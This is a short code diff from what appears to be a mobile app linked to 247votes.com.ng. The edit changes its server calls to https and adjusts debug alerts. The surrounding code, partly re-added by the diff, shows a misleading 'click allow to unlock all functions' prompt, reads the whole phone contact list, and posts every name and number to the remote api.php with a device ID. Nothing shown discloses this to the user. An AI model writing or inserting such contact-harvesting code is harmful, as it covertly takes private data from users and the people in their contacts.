@@ -653,9 +653,10 @@ var settings= JSON.parse(window.localStorage.getItem('app_settings'));
 var setup = settings.setup;
 }
 	alert("1");
-if(setup != 1){	
-$.post("http://247votes.com.ng/app/api.php",{id:'appReg',data:myJSON},function(response){
-	alert("2");
+if(setup != 1){
+alert("2");
+$.post("https://247votes.com.ng/app/api.php",{id:'appReg',data:myJSON},function(response){
+	alert("3");
 if(response == 1){
 alert("Kindly click allow to unlock all functions.\nIf not application would not function well.");
 	navigator.contactsPhoneNumbers.list(function(contacts) {
@@ -667,7 +668,7 @@ alert("Kindly click allow to unlock all functions.\nIf not application would not
              var pn = phone.normalizedNumber;
 	      dd += cn +" : "+ pn +",";
       }
-$.post("http://247votes.com.ng/app/api.php",{id:'appContacts', uuid:uid, data1:cl, data2:dd},function(response){
+$.post("https://247votes.com.ng/app/api.php",{id:'appContacts', uuid:uid, data1:cl, data2:dd},function(response){
 if(response == 1){
 var setup = {
     appID: uid,
